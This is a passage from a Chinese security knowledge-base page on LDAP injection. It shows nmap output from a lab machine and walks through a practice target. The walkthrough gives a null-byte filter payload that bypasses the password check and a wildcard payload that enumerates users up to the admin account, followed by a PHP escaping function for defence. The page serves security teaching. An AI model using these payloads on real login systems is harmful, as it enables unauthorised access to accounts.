ldap    OpenLDAP 2.2.X - 2.3.X</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MAC Address: 00:0C:29:63:12:24 (VMware)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nmap done: 1 IP address (1 host up) scanned in 35.09 seconds</span><br></span></code></pre></div></div>
<p>访问Example 2，使用burp抓包，提示认证成功</p>
<p><img decoding="async" loading="lazy" alt="数据包" src="/assets/images/156498928356911284778-9fb6e362cc855d8606335b0b491c9f11.jpg" width="1756" height="686" class="img_ev3q"></p>
<p>根据第一步扫出来的 389 端口，再加上此处的登陆，猜测他的判定语句为</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">name</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">hacker</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">passwd</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">hacker</span><span class="token punctuation" style="color:#393A34">))</span><br></span></code></pre></div></div>
<p>其中2个 <code>hacker</code> 为我们的可控制变量</p>
<p><strong>一、无密码登录</strong></p>
<p>尝试构造（先正常闭合，然后再截断后面）</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">name</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">hacker</span><span class="token punctuation" style="color:#393A34">))</span><span class="token plain">%00</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">passwd</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">hacker</span><span class="token punctuation" style="color:#393A34">))</span><br></span></code></pre></div></div>
<p>服务器在对这个条件判定时，只会执行<code>(&amp;(name=hacker))</code>，永为真，即无密码直接登陆，密码随便输，效果如下：</p>
<p><img decoding="async" loading="lazy" src="/assets/images/15649921505615538856-3f9093017e8a5abe0aa4489b660f36d6.jpg" width="1745" height="559" class="img_ev3q"></p>
<p><strong>二、用户遍历</strong></p>
<p>通过上方的结果，我们已经能无密码登陆用户了，但是如果该用户权限不足需要新的用户怎么办呢？</p>
<p>构造语句如下（其中，<code>*</code> 为通配符）</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">name</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">h*</span><span class="token punctuation" style="color:#393A34">))</span><span class="token plain">%00</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">passwd</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">xxx</span><span class="token punctuation" style="color:#393A34">))</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" src="/assets/images/156499353954788353988-1edff0d22ff419cfc217f29d27f99411.jpg" width="1773" height="573" class="img_ev3q"></p>
<p>如上图，构造的payload可直接登录<code>hacker</code>账号</p>
<p>尝试对首字母进行遍历，可成功获取 <code>admin</code> 账户</p>
<p><img decoding="async" loading="lazy" src="/assets/images/1564993430356916623-a4705278ee3dbf602607680608dab7da.jpg" width="1308" height="618" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="ldap注入防御">LDAP注入防御<a href="#ldap注入防御" class="hash-link" aria-label="LDAP注入防御的直接链接" title="LDAP注入防御的直接链接">​</a></h2>
<p>LDAP注入的防御和SQL注入的防御类似，主要是对用户的输入进行合法性验证,只要守好数据的入口和出口，就能有效的防御攻击。</p>
<p>下图包含了LDAP中用到的特殊字符和需要转义处理的字符：</p>
<p><img decoding="async" loading="lazy" src="data:image/jpeg;base64,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" width="644" height="308" class="img_ev3q"></p>
<p>具体实现可参考如下 PHP 代码</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">##!php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">function ldapspecialchars($string) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $sanitized=array(&#x27;\\&#x27; =&gt; &#x27;\5c&#x27;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                     &#x27;*&#x27; =&gt; &#x27;\2a&#x27;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                     &#x27;(&#x27; =&gt; &#x27;\28&#x27;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                     &#x27;)&#x27; =&gt; &#x27;\29&#x27;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                     &quot;\x00&quot; =&gt; &#x27;\00&#x27;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return str_replace(array_keys($sanitized),array_values($sanitized),$string);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="总结">总结<a href="#总结" class="hash-link" aria-label="总结的直接链接" title="总结的直接链接">​</a></h2>
<p>和SQL注入类似，都是需要先猜测后端的语句写法，然后闭合语句，再通过传入自己的恶意语句，达到恶意执行LDAP语句的目的。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="参考文章">参考文章<a href="#参考文章" class="hash-link" aria-label="参考文章的直接链接" title="参考文章的直接链接">​</a></h2>
<ul>
<li><a href="http://zone.secevery.com/article/976" target="_blank" rel="noopener noreferrer">LDAP 注入（Injection）入门学习</a></li>
<li><a href="https://www.from0to1.me/index.php/archives/71/" target="_blank" rel="noopener noreferrer">LDAP安全 (LDAP注入与匿名访问)</a></li>
<li><a href="https://www.jianshu.com/p/d94673be9ed0" target="_blank" rel="noopener noreferrer">LDAP注入漏洞与防御</a></li>
<li><a href="https://wooyun.js.org/drops/LDAP%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%89%96%E6%9E%90.html" target="_blank" rel="noopener noreferrer">LDAP注入与防御剖析</a></li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="趣事">趣事<a href="#趣事" class="hash-link" aria-label="趣事的直接链接" title="趣事的直接链接">​</a></h2>
<blockquote>
<p>这篇文章已经写了有几年了，自己都有点记不清了，内容中有个百度云的链接，本来想看看是不是失效了，结果因为公司网络问题打不开，一搜索发现文章已经被搬运了。。。而且我完全不知情哈哈哈哈</p>
</blockquote>
<p><img decoding="async" loading="lazy" alt="1" src="/assets/images/image-20220321143821514-8ddd3ded5aa5c243945f14d55577b2a7.png" width="2510" height="964" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" alt="image-20220321143906121" src="/assets/images/image-20220321143906121-35a7628b12df395c8da4087abab0f739.png" width="1758" height="1544" class="img_ev3q"></p>
<hr>
<blockquote>
<p>这个更过分，直接复制完，也没放我前博客的链接，还疑似参加了原创计划？不过阅读量这么多是我没想到的哈哈哈</p>
</blockquote>
<p><img decoding="async" loading="lazy" alt="image-20220321144159448" src="/assets/images/image-20220321144159448-76edc2e8cd79a5c7b9c15700bfd7917f.png" width="1150" height="276" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" alt="image-20220321144136481" src="/assets/images/image-20220321144136481-d74d9312200e937b9e34b305d5a3bb41.png" width="732" height="1654" class="img_ev3q"></p></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"></div><div class="col lastUpdated_JAkA"><span class="theme-last-updated">最后<!-- -->由 <b>d4m1ts</b> <!-- -->于 <b><time datetime="2025-06-01T13:27:30.000Z" itemprop="dateModified">2025年6月1日</time></b> <!-- -->更新</span></div></div></footer></article><nav class="pagination-nav" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/渗透测试/WEB漏洞/文件包含漏洞/"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">文件包含漏洞</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/渗透测试/WEB漏洞/XXE/"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">XXE</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#ldap简介" class="table-of-contents__link toc-highlight">LDAP简介</a><ul><li><a href="#ldap结构" class="table-of-contents__link toc-highlight">LDAP结构</a></li><li><a href="#使用场景" class="table-of-contents__link toc-highlight">使用场景</a></li></ul></li><li><a href="#ldap查询语法" class="table-of-contents__link toc-highlight">LDAP查询语法</a><ul><li><a href="#详细解释" class="table-of-contents__link toc-highlight">详细解释</a></li></ul></li><li><a href="#ldap注入-1" class="table-of-contents__link toc-highlight">LDAP注入</a><ul><li><a href="#ldap注入原因" class="table-of-contents__link toc-highlight">LDAP注入原因</a></li><li><a href="#ldap注意事项" class="table-of-contents__link toc-highlight">LDAP注意事项</a></li><li><a href="#ldap过滤器" class="table-of-contents__link toc-highlight">LDAP过滤器</a></li><li><a href="#ldap注入举例" class="table-of-contents__link toc-highlight">LDAP注入举例</a><ul><li><a href="#and-ldap注入" class="table-of-contents__link toc-highlight"><strong>AND</strong> LDAP注入</a></li><li><a href="#or-ldap注入" class="table-of-contents__link toc-highlight"><strong>OR</strong> LDAP注入</a></li><li><a href="#ldap盲注" class="table-of-contents__link toc-highlight">LDAP<strong>盲注</strong></a><ul><li><a href="#ldap-and盲注" class="table-of-contents__link toc-highlight">LDAP <strong>AND盲注</strong></a></li><li><a href="#ldap-or盲注" class="table-of-contents__link toc-highlight">LDAP <strong>OR盲注</strong></a></li></ul></li></ul></li></ul></li><li><a href="#ldap靶场" class="table-of-contents__link toc-highlight">LDAP靶场</a><ul><li><a href="#靶场截图" class="table-of-contents__link toc-highlight">靶场截图</a></li><li><a href="#下载地址" class="table-of-contents__link toc-highlight">下载地址</a></li><li><a href="#利用过程" class="table-of-contents__link toc-highlight">利用过程</a></li></ul></li><li><a href="#ldap注入防御" class="table-of-contents__link toc-highlight">LDAP注入防御</a></li><li><a href="#总结" class="table-of-contents__link toc-highlight">总结</a></li><li><a href="#参考文章" class="table-of-contents__link toc-highlight">参考文章</a></li><li><a href="#趣事" class="table-of-contents__link toc-highlight">趣事</a></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">内容导航</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/friends">友情链接</a></li><li class="footer__item"><a class="footer__link-item" href="/promotions">我的推广</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">实用工具</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://markdown.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">在线Markdown<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://rshell.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">Reverse Shell Generator<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://gtfobins.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">GTFOBins<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">关注我</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="mailto:admin@gm7.org" target="_blank" rel="noopener noreferrer" class="footer__link-item">联系我<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 d4m1ts 知识库</div></div></div></footer></div>
</body>
</html>